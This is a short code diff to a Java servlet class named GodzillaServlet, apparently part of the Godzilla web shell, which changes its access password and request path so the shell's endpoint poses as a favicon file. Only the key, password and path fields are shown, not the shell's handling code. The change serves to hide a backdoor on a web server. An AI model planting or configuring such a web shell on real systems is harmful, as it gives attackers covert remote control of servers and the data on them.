@@ -27,8 +27,8 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     String xc = "3c6e0b8a9c15224a";
-    public String Pwd = "pass1024";
-    public String path = "/favicondemo.ico";
+    public String Pwd = "favicon";
+    public String path = "/favicons.ico";
     String md5;
     public String cs;
 
